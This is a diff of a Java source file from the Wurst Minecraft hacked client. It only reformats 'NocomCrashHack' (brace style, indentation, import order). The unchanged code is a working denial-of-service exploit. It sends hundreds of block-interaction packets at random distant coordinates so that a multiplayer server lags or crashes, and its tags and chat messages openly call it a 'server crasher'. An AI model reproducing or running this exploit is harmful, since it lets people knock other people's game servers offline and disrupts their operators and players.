@@ -5,11 +5,7 @@
  * License, version 3. If a copy of the GPL was not distributed with this
  * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt
  */
-		package net.wurstclient.hacks;
-
-import java.text.NumberFormat;
-import java.util.Locale;
-import java.util.Random;
+package net.wurstclient.hacks;
 
 import net.minecraft.util.Hand;
 import net.minecraft.util.hit.BlockHitResult;
@@ -23,84 +19,79 @@ import net.wurstclient.settings.SliderSetting;
 import net.wurstclient.settings.SliderSetting.ValueDisplay;
 import net.wurstclient.util.ChatUtils;
 
+import java.text.NumberFormat;
+import java.util.Locale;
+import java.util.Random;
+
 @SearchTags({"nocom crash", "ServerCrasher", "server crasher", "ServerLagger",
-		"server lagger"})
-public final class NocomCrashHack extends Hack
-{
-	private final Random random = new Random();
+        "server lagger"})
+public final class NocomCrashHack extends Hack {
+    private final Random random = new Random();
 
-	private final SliderSetting packets =
-			new SliderSetting("Packets", "The number of packets to send.", 500, 1,
-					1000, 1, ValueDisplay.INTEGER);
+    private final SliderSetting packets =
+            new SliderSetting("Packets", "The number of packets to send.", 500, 1,
+                    1000, 1, ValueDisplay.INTEGER);
 
-	public NocomCrashHack()
-	{
-		super("NocomCrash");
-		setCategory(Category.OTHER);
-		addSetting(packets);
-	}
+    public NocomCrashHack() {
+        super("NocomCrash");
+        setCategory(Category.OTHER);
+        addSetting(packets);
+    }
 
-	@Override
-	public void onEnable()
-	{
-		String seconds = NumberFormat.getNumberInstance(Locale.ENGLISH)
-				.format(packets.getValueI() / 100.0);
-		ChatUtils.message(
-				"Sending packets. Will take approximately " + seconds + "s.");
+    @Override
+    public void onEnable() {
+        String seconds = NumberFormat.getNumberInstance(Locale.ENGLISH)
+                .format(packets.getValueI() / 100.0);
+        ChatUtils.message(
+                "Sending packets. Will take approximately " + seconds + "s.");
 
-		Thread thread = new Thread(() -> {
+        Thread thread = new Thread(() -> {
 
-			try
-			{
-				sendPackets(packets.getValueI());
-				ChatUtils.message("Done sending, server should start to lag");
+            try {
+                sendPackets(packets.getValueI());
+                ChatUtils.message("Done sending, server should start to lag");
 
-			}catch(Exception e)
-			{
-				e.printStackTrace();
-				ChatUtils.error("Failed to crash, caught "
-						+ e.getClass().getSimpleName() + ".");
-			}
-			setEnabled(false);
+            } catch (Exception e) {
+                e.printStackTrace();
+                ChatUtils.error("Failed to crash, caught "
+                        + e.getClass().getSimpleName() + ".");
+            }
+            setEnabled(false);
 
-		}, "NocomCrash");
+        }, "NocomCrash");
 
-		thread.start();
-	}
+        thread.start();
+    }
 
-	public void sendPackets(int nPackets) throws InterruptedException
-	{
-		for(int i = 0; i < nPackets; i++)
-		{
-			// display current packet
-			if(i % 100 == 0 || i == nPackets)
-				ChatUtils.message(String.format("%d/%d", i, nPackets));
+    public void sendPackets(int nPackets) throws InterruptedException {
+        for (int i = 0; i < nPackets; i++) {
+            // display current packet
+            if (i % 100 == 0 || i == nPackets)
+                ChatUtils.message(String.format("%d/%d", i, nPackets));
 
-			if(MC.getNetworkHandler() == null)
-				break;
+            if (MC.getNetworkHandler() == null)
+                break;
 
-			Thread.sleep(10);
+            Thread.sleep(10);
 
-			sendNocomPacket();
-		}
-	}
+            sendNocomPacket();
+        }
+    }
 
-	public void sendNocomPacket()
-	{
-		Vec3d pos = pickRandomPos();
-		BlockHitResult blockHitResult =
-				new BlockHitResult(pos, Direction.DOWN, new BlockPos(pos), false);
+    public void sendNocomPacket() {
+        Vec3d pos = pickRandomPos();
+        BlockHitResult blockHitResult =
+                new BlockHitResult(pos, Direction.DOWN, new BlockPos(pos), false);
 
-		IMC.getInteractionManager()
-				.sendPlayerInteractBlockPacket(Hand.MAIN_HAND, blockHitResult);
-	}
+        IMC.getInteractionManager()
+                .sendPlayerInteractBlockPacket(Hand.MAIN_HAND, blockHitResult);
+    }
 
-	private Vec3d pickRandomPos()
-	{
-		int x = random.nextInt(16777215);
-		int y = 255;
-		int z = random.nextInt(16777215);
+    private Vec3d pickRandomPos() {
+        int x = random.nextInt(16777215);
+        int y = 255;
+        int z = random.nextInt(16777215);
 
-		return new Vec3d(x, y, z);
-	}
+        return new Vec3d(x, y, z);
+    }
 }
